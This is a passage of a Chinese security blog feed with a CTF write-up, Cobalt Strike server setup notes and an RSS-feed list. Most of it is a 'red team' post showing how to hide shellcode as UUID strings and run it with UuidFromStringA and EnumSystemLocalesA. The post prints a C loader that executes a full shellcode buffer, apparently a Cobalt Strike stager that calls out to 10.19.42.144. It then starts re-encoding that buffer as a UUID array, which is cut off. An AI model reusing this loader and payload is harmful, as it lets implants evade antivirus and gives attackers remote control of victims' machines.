class="line">document.cookie&#x3D;&quot;session&#x3D;xxxxxx&quot; &#x2F;&#x2F;修改浏览器上的cookie</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2465855897.png"></p><p>好家伙不讲武德最后还给我一题，手工做一下⑧，最终得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1224177566.png"></p><h2 id="5-走私者的愤怒"><a href="#5-走私者的愤怒" class="headerlink" title="5.走私者的愤怒"></a>5.走私者的愤怒</h2><blockquote><p>本题为宝藏走私者的更改版本，考点相同，请先做出宝藏走私者<br>Liki 日记：<br>2020年2月2日：<br>今天警局寄来一封信，是走私者 Switch 寄来的，信里只有一句话<br>“我最讨厌顺风车，我将带来我的愤怒”<br>真是让人摸不着头脑……<br>我看不懂，但我大受震撼。<br>Challenge Address<br><a href="http://police.liki.link/">http://police.liki.link</a></p></blockquote><h1 id="0X3Crypto"><a href="#0X3Crypto" class="headerlink" title="0X3Crypto"></a>0X3Crypto</h1><h2 id="1-まひと"><a href="#1-まひと" class="headerlink" title="1.まひと"></a>1.まひと</h2><blockquote><p>大家好，我叫真人，来自咒术回战，你也可以叫我，缝合怪！！</p><p><a href="https://pan.baidu.com/s/1OdvdpH6_5vO0gx2JICb5nA"><strong>附件</strong></a>（提取码：er9q）</p></blockquote><p>摩斯-&gt;ASCII-&gt;base64-&gt;Vigenere-Cipher（维吉尼亚解密，key=liki）<br>最后一波神仙操作，我直呼内行<br>栅栏（key=6）-&gt;凯撒（key=13）-&gt;逆序得到flag</p><h2 id="2-Transformer"><a href="#2-Transformer" class="headerlink" title="2.Transformer"></a>2.Transformer</h2><blockquote><p>所有人都已做好准备,月黑之时即将来临,为了击毁最后的主控能量柱,打开通往芝加哥的升降桥迫在眉睫 看守升降桥的控制员已经失踪,唯有在控制台的小房间留下来的小纸条,似乎是控制员防止自己老了把密码忘记而写下的,但似乎都是奇怪的字母组合,唯一有价值的线索是垃圾桶里的两堆被碎纸机粉碎的碎纸,随便查看几张,似乎是两份文件,并且其中一份和小纸条上的字母规律有点相像 附件md5:0340142700c8f63546368fa14fd6fb24</p><p><a href="https://pan.baidu.com/s/1UaYVuW0CdZAXJb5Rp0nrDQ"><strong>附件</strong></a>（提取码：x4dp）</p></blockquote><p><a href="https://quipqiup.com/"><strong>在线工具</strong></a><br>qypth=hgame进行爆破</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2706249689.png"></p><h2 id="3-对称之美"><a href="#3-对称之美" class="headerlink" title="3.对称之美"></a>3.对称之美</h2><blockquote><p>美术大师 Liki 总说，对称是世界上最美的结构…</p><p><a href="https://pan.baidu.com/s/1866PAY_o_KOdljPFyc34EQ">附件</a>（提取码：2hoy）</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HGAME </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次CS的搭建过程</title>
      <link href="2021/02/03/%E8%AE%B0%E4%B8%80%E6%AC%A1CS%E7%9A%84%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/"/>
      <url>2021/02/03/%E8%AE%B0%E4%B8%80%E6%AC%A1CS%E7%9A%84%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<blockquote><p>前言：为提升实战技术并积累实战经验，于是我在vultr服务器上第一次搭建了CS<br>环境：<br>Debian10<br>Cobalt Strike 4.1</p></blockquote><p>首先，我们先要准备一台Debian10的服务器（其他也可）<br>接着我们ssh连上服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh root@IP        登录（回车yes输入密码</span><br><span class="line">apt update        </span><br></pre></td></tr></table></figure><p>打开sftp将cs上传（put上传文件 get下载文件）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sftp root@IP    进入ftp（回车输入密码</span><br><span class="line">ls        </span><br><span class="line">put C:\Users\xxx\cs4.1.zip        上传cs</span><br></pre></td></tr></table></figure><p>返回ssh解压cs（Ubuntu默认是没有安装unzip）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install unzip        安装unzip</span><br><span class="line">unzip cs4.1.zip        解压cs</span><br></pre></td></tr></table></figure><p>安装java</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install default-jdk</span><br></pre></td></tr></table></figure><p>启动cs</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd cs4.1    进入cs文件</span><br><span class="line">sudo .&#x2F;teamserver IP 密码        启动cs并设置密码</span><br><span class="line">如果报错出现无此命令，使用“chmod 777 teamserver”授予权限即可。</span><br></pre></td></tr></table></figure><p>结束</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ctrl c</span><br></pre></td></tr></table></figure><p>由于cs连接很容易断开，在启动cs之前我们需要安装screen并启动它</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt install screen</span><br><span class="line">apt-get install screen</span><br><span class="line">screen -S test        创建一个名字为test的screen会话</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CyberSecurityRSS</title>
      <link href="2021/02/01/CyberSecurityRSS/"/>
      <url>2021/02/01/CyberSecurityRSS/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>作者:zer0yu<br>github开源地址：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//github.com/zer0yu/CyberSecurityRSS</span></span><br></pre></td></tr></table></figure><h1 id="CyberSecurityRSS"><a href="#CyberSecurityRSS" class="headerlink" title="CyberSecurityRSS"></a>CyberSecurityRSS</h1><p>简介: 网络安全相关的RSS订阅，帮助建立个人情报来源和日常知识库更新 更新频率: 每2个月一次<br>文件说明:<br>  1.附录加一些可能没有rss的站点，但是是本人日常浏览的不错站点，重点写出来了。<br>  2.tiny.opml是个人速览使用的一个精简版本。<br>  3.CyberSecurityRSS.xml是集合了泉哥和rr的一个十分丰富的版本，也分好了类别。</p><p>PS: 如果遇到导入文件格式问题的可以将xml后缀修改为opml后缀，反之也可。</p><h2 id="使用方法1-Reeder3-Reeder4-macOS-IOS的首选"><a href="#使用方法1-Reeder3-Reeder4-macOS-IOS的首选" class="headerlink" title="使用方法1 - Reeder3/Reeder4 (macOS, IOS的首选)"></a>使用方法1 - Reeder3/Reeder4 (macOS, IOS的首选)</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2175787659.png"></p><h2 id="使用方法2-yarr-macOS-Windows-Linux"><a href="#使用方法2-yarr-macOS-Windows-Linux" class="headerlink" title="使用方法2 - yarr (macOS, Windows, Linux)"></a>使用方法2 - yarr (macOS, Windows, Linux)</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2163151798.png"></p><h2 id="使用方法3-Leaf"><a href="#使用方法3-Leaf" class="headerlink" title="使用方法3 - Leaf"></a>使用方法3 - Leaf</h2><p>直接导入提供的文件即可</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/385235879.png"></p><h2 id="使用方法4-Feedly"><a href="#使用方法4-Feedly" class="headerlink" title="使用方法4 - Feedly"></a>使用方法4 - Feedly</h2><p>这种是网页的形式(当然也有APP)，feedly的免费版本，tiny.opml可以直接导入并够用，但是CyberSecurityRSS.xml版本会超过免费的订阅限制。</p><h2 id="使用方法5-深蓝阅读"><a href="#使用方法5-深蓝阅读" class="headerlink" title="使用方法5 - 深蓝阅读"></a>使用方法5 - 深蓝阅读</h2><p>同1</p><h2 id="使用方法6-Feeder-Android推荐使用"><a href="#使用方法6-Feeder-Android推荐使用" class="headerlink" title="使用方法6 - Feeder(Android推荐使用)"></a>使用方法6 - Feeder(Android推荐使用)</h2><p>同1</p><h2 id="使用方法7-Zr-Android推荐使用"><a href="#使用方法7-Zr-Android推荐使用" class="headerlink" title="使用方法7 - Zr(Android推荐使用)"></a>使用方法7 - Zr(Android推荐使用)</h2><p>同1</p><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p>others.md中是我一般会主动浏览的站点并且一些站点没有提供rss的都写在了里面。</p><p>以下为使用截图<br>掌握各类推送信息 十分方便</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/477589136.png"></p><p>Ps也可使用另一个开源RSS阅读项目</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;anyant&#x2F;rssant</span><br></pre></td></tr></table></figure><p>导入订阅文件,即可阅读</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3780341584.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1421809800.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3193456853.png"></p><p>如果发现好的网站订阅,也可以自己添加</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/612828755.png"></p>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具推送 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红队技巧-利用uuid加载shellcode</title>
      <link href="2021/01/30/%E7%BA%A2%E9%98%9F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8uuid%E5%8A%A0%E8%BD%BDshellcode/"/>
      <url>2021/01/30/%E7%BA%A2%E9%98%9F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8uuid%E5%8A%A0%E8%BD%BDshellcode/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>近期国外的Tweet上面的Check Point Research发布了一篇有趣的推文：<br>这篇推文大概讲的是通过分析了一个恶意样本，找到一种非常有趣的向内存写入shellcode方式。<br>这里就不细究钓鱼文档利用宏加载shellcode的细节了，感兴趣的可以去看这篇文章：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;research.nccgroup.com&#x2F;2021&#x2F;01&#x2F;23&#x2F;rift-analysing-a-lazarus-shellcode-execution-method&#x2F;</span><br></pre></td></tr></table></figure><p>值得注意的是：<br>在自定义代码中，攻击者使用了windows api 遍历了大量硬编码 UUID 值列表，并且每次都提供指向分配内存（堆）的指针，深入分析后，发现了一种将数据写入堆的方法。<br>这种技术早在2017年就有国外大佬提出，但是最近才抓到恶意样本，爆出来！！</p><h1 id="uuid是什么"><a href="#uuid是什么" class="headerlink" title="uuid是什么?"></a>uuid是什么?</h1><p>通用唯一识别码(Universally Unique Identifier,缩写：UUID),是用于计算机体系中以识别信息数目的一个128位标识符，根据标准方法生成，不依赖中央机构的注册和分配，UUID具有唯一性。<br>当然还有一种GUID（全局唯一标识符（英语：Globally Unique Identifier，缩写：GUID）），是一种由算法生成的唯一标识，通常表示成32个16进制数字（0－9，A－F）组成的字符串，如：{21EC2020-3AEA-1069-A2DD-08002B30309D}，它实质上是一个128位长的二进制整数</p><h3 id="1-那两种有什么区别？"><a href="#1-那两种有什么区别？" class="headerlink" title="1.那两种有什么区别？"></a>1.那两种有什么区别？</h3><p>简单的说，uuid 是一种标准, 而guid是uuid的一种实现.，GUID 是微软对UUID这个标准的实现。</p><h3 id="2-UUID有什么作用？"><a href="#2-UUID有什么作用？" class="headerlink" title="2.UUID有什么作用？"></a>2.UUID有什么作用？</h3><p>看一个示例：<br>COMB（combine）型是数据库特有的一种设计思想，可以理解为一种改进的GUID，它通过组合GUID和系统时间，以使其在索引和检索事有更优的性能，数据库中没有COMB类型，它是Jimmy Nilsson在他的“The Cost of GUIDs as Primary Keys”一文中设计出来的。<br>COMB数据类型的基本设计思路是这样的：既然UniqueIdentifier数据因毫无规律可言造成索引效率低下，影响了系统的性能，那么我们能不能通过组合的方式，保留UniqueIdentifier的前10个字节，用后6个字节表示GUID生成的时间（DateTime），这样我们将时间信息与UniqueIdentifier组合起来，在保留UniqueIdentifier的唯一性的同时增加了有序性，以此来提高索引效率。<br>简而言之：UUID 的目的是让分布式系统中的所有元素，都能有唯一的标识，而不需要透过中央控制端来做标识的指定。如此一来，每个人都可以建立不与其它人冲突的 UUID，在这样的情况下，就不需考虑数据库建立时的名称重复问题。</p><h1 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h1><p>首先我们得先关注一下两个windows api 函数</p><h3 id="1-UuidFromStringA"><a href="#1-UuidFromStringA" class="headerlink" title="1.UuidFromStringA"></a>1.UuidFromStringA</h3><p>查看微软的官方文档，给出了这样的解释：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2639796569.png"></p><p>这个意思说吧，把uuid值转换成二进制字节序列，该api 需要两个参数<br>1.转换成二进制字节序列的uuid的指针<br>2.以二进制形式返回指向UUID的指针</p><p>第一项参数很好理解，第二项参数可能翻译过来有点牵强，很好理解，就是用来接收二进制字节序列的指针。<br>其实python 中也有uuid库，转换挺方便的，把字节序列转换成uuid，再把uuid转换成字节序列</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4119777440.png"></p><p>还有需要注意的点，就是windows 二进制字节序列是用的小端计数法,转换时且二进制序列必须16个字符为一组。</p><h3 id="2-EnumSystemLocalesA"><a href="#2-EnumSystemLocalesA" class="headerlink" title="2.EnumSystemLocalesA"></a>2.EnumSystemLocalesA</h3><p>微软官方文档：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1012990053.png"></p><p>这里牵扯到回调函数：<br>回调函数就是一个通过函数指针调用的函数，意思是通过函数指针来调用函数，字面不好理解，你不妨看看以下示例</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">（（<span class="keyword">void</span>（*）（））exec）();</span><br></pre></td></tr></table></figure><p>这段代码很经典，很多人看了很懵逼，但是对于懂指针的人来说，理所当然，在c语言中，函数变量名存的就是一个函数入口地址，换句话说函数变量名就是一个指针。</p><p>然后再让我们理解以下上面那句代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span>(*)() <span class="comment">#定义一个函数指针，函数返回值为空</span></span><br><span class="line">（（<span class="keyword">void</span>（*）（））exec <span class="comment">#强制类型转换，把exec指针强制转换成函数指针</span></span><br><span class="line">（（<span class="keyword">void</span>（*）（））exec）();<span class="comment">#执行入口地址为exec指向的地址的函数</span></span><br></pre></td></tr></table></figure><p>而EnumSystemLocalesA 函数的第一次个参数就是回调函数地址，第二个参数是指定要枚举的语言环境标识符的标志。</p><p>那么上面的就可以写成这个样子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EnumSystemLocalesA（exec,<span class="number">0</span>）;</span><br></pre></td></tr></table></figure><h1 id="利用uuid来加载shellcode，上线cs"><a href="#利用uuid来加载shellcode，上线cs" class="headerlink" title="利用uuid来加载shellcode，上线cs"></a>利用uuid来加载shellcode，上线cs</h1><p>我们先来看普通的shellcode 的c加载方式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line">#不弹窗</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>) </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">&quot;/INCREMENTAL:NO&quot;</span>)   </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[]=<span class="string">&quot;shellcode binary &quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *a = VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(xor_xcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">  <span class="built_in">memcpy</span>(a, xcode, <span class="keyword">sizeof</span>(xcode));</span><br><span class="line">  ((<span class="keyword">void</span>(*)())a)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\x84\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\x50\x00\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x70\x5b\x31\xd2\x52\x68\x00\x02\x40\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xc3\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\xaa\xc5\xe2\x5d\xff\xd5\x89\xc1\x68\x45\x21\x5e\x31\xff\xd5\x31\xff\x57\x6a\x07\x51\x56\x50\x68\xb7\x57\xe0\x0b\xff\xd5\xbf\x00\x2f\x00\x00\x39\xc7\x74\xb7\x31\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x8b\xff\xff\xff\x2f\x31\x6b\x6a\x56\x00\xfe\xdc\x7a\x2d\x31\xc9\xe7\x28\x1e\xb5\x42\x5f\x62\xa3\xf5\x64\x42\x79\x2d\xa2\xd8\xf7\x74\xca\xc1\x64\xc7\xc2\xfe\x32\xb2\x36\x0a\xa0\x90\x4e\xfa\xd4\x47\x04\xa4\x8b\xd9\xe6\x65\xa1\x8f\xbe\xe4\xb6\x95\x63\xf0\xb4\x46\x20\x85\xf8\x60\x5e\xb1\xf8\xa0\x59\xef\x9e\xb2\xc6\xe6\xf9\x5d\x8e\x07\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x31\x30\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x32\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x36\x2e\x30\x3b\x20\x54\x6f\x75\x63\x68\x3b\x20\x4d\x41\x53\x50\x4a\x53\x29\x0d\x0a\x00\x91\xa8\x10\xb7\xda\x80\x7f\xab\xc7\x23\x16\x2f\x4b\x61\xbd\xeb\xa5\x14\x6f\x90\x4b\xdf\x5a\x58\xe0\x57\x55\x1f\xdb\x6a\x56\x74\xc2\xa1\x9c\x9f\x32\xda\x91\x0d\x01\x10\x2d\x95\xef\x8e\x49\x72\x3a\x2b\x9e\x59\x8e\x85\xa6\xad\xb6\x9c\xc6\x98\x10\x7d\x09\x1f\x60\xa3\x4a\xea\xbe\x4a\xf5\x49\x8a\xc7\x18\xd6\x60\x22\x51\x17\xb8\xd6\x61\xd3\x8a\x81\x37\x3e\x6a\x3d\x1c\x3d\xc5\xf3\xa0\x57\x02\x04\x44\x57\xc1\x14\x23\x71\xc2\x08\x87\x6c\x94\x6b\x89\xc1\xd9\x2b\xcc\x6b\x62\x25\x3f\xbb\x9f\x56\x02\xf1\x54\x4d\x4d\x91\x4e\x89\x5b\xda\x5f\xf0\x92\xa5\xac\xb2\xaf\xcf\xbb\xe2\xaf\xb0\xca\x5b\x08\x83\x4c\x92\x7a\xb5\x97\xb9\xd2\x07\xc9\x8f\xb7\x80\xfc\x26\x3d\xa3\xd1\x9e\x29\x42\x05\xcd\x0b\x78\xc2\x11\x86\x4f\x66\x57\xda\xe2\x4b\x98\xcc\x46\x4d\xe5\xbd\xfe\xc7\x2c\xc4\xd3\xe5\xc0\xf9\x43\xca\xd4\x1d\x5a\x73\xda\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\x00\x00\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\xa9\xfd\xff\xff\x31\x30\x2e\x31\x39\x2e\x34\x32\x2e\x31\x34\x34\x00\x12\x34\x56\x78&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span>* shellcode = (<span class="keyword">void</span>*)VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">  <span class="built_in">memcpy</span>(shellcode, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  ((<span class="keyword">void</span>(*)())shellcode)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们来利用uuid写shellcode</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Rpc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;Rpcrt4.lib&quot;</span>)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* uuids[] = &#123; <span class="string">&quot;0089e8fc-0000-8960-e531-d2648b52308b&quot;</span>,<span class="string">&quot;528b0c52-8b14-2872-0fb7-4a2631ff31c0&quot;</span>,<span class="string">&quot;7c613cac-2c02-c120-cf0d-01c7e2f05257&quot;</span>,<span class="string">&quot;8b10528b-3c42-d001-8b40-7885c0744a01&quot;</span>,<span class="string">&quot;488b50d0-8b18-2058-01d3-e33c498b348b&quot;</span>,<span class="string">&quot;ff31d601-c031-c1ac-cf0d-01c738e075f4&quot;</span>,<span class="string">&quot;3bf87d03-247d-e275-588b-582401d3668b&quot;</span>,<span class="string">&quot;588b4b0c-011c-8bd3-048b-01d089442424&quot;</span>,<span class="string">&quot;59615b5b-515a-e0ff-585f-5a8b12eb865d&quot;</span>,<span class="string">&quot;74656e68-6800-6977-6e69-54684c772607&quot;</span>,<span class="string">&quot;ff31d5ff-5757-5757-5768-3a5679a7ffd5&quot;</span>,<span class="string">&quot;000084e9-5b00-c931-5151-6a0351516850&quot;</span>,<span class="string">&quot;53000000-6850-8957-9fc6-ffd5eb705b31&quot;</span>,<span class="string">&quot;006852d2-4002-5284-5252-53525068eb55&quot;</span>,<span class="string">&quot;d5ff3b2e-c689-c383-5031-ff57576aff53&quot;</span>,<span class="string">&quot;062d6856-7b18-d5ff-85c0-0f84c3010000&quot;</span>,<span class="string">&quot;f685ff31-0474-f989-eb09-68aac5e25dff&quot;</span>,<span class="string">&quot;68c189d5-2145-315e-ffd5-31ff576a0751&quot;</span>,<span class="string">&quot;b7685056-e057-ff0b-d5bf-002f000039c7&quot;</span>,<span class="string">&quot;ff31b774-91e9-0001-00e9-c9010000e88b&quot;</span>,<span class="string">&quot;2fffffff-6b31-566a-00fe-dc7a2d31c9e7&quot;</span>,<span class="string">&quot;42b51e28-625f-f5a3-6442-792da2d8f774&quot;</span>,<span class="string">&quot;c764c1ca-fec2-b232-360a-a0904efad447&quot;</span>,<span class="string">&quot;d98ba404-65e6-8fa1-bee4-b69563f0b446&quot;</span>,<span class="string">&quot;60f88520-b15e-a0f8-59ef-9eb2c6e6f95d&quot;</span>,<span class="string">&quot;5500078e-6573-2d72-4167-656e743a204d&quot;</span>,<span class="string">&quot;6c697a6f-616c-352f-2e30-2028636f6d70&quot;</span>,<span class="string">&quot;62697461-656c-203b-4d53-49452031302e&quot;</span>,<span class="string">&quot;57203b30-6e69-6f64-7773-204e5420362e&quot;</span>,<span class="string">&quot;57203b32-574f-3436-3b20-54726964656e&quot;</span>,<span class="string">&quot;2e362f74-3b30-5420-6f75-63683b204d41&quot;</span>,<span class="string">&quot;534a5053-0d29-000a-91a8-10b7da807fab&quot;</span>,<span class="string">&quot;2f1623c7-614b-ebbd-a514-6f904bdf5a58&quot;</span>,<span class="string">&quot;1f5557e0-6adb-7456-c2a1-9c9f32da910d&quot;</span>,<span class="string">&quot;952d1001-8eef-7249-3a2b-9e598e85a6ad&quot;</span>,<span class="string">&quot;98c69cb6-7d10-1f09-60a3-4aeabe4af549&quot;</span>,<span class="string">&quot;d618c78a-2260-1751-b8d6-61d38a81373e&quot;</span>,<span class="string">&quot;3d1c3d6a-f3c5-57a0-0204-4457c1142371&quot;</span>,<span class="string">&quot;6c8708c2-6b94-c189-d92b-cc6b62253fbb&quot;</span>,<span class="string">&quot;f102569f-4d54-914d-4e89-5bda5ff092a5&quot;</span>,<span 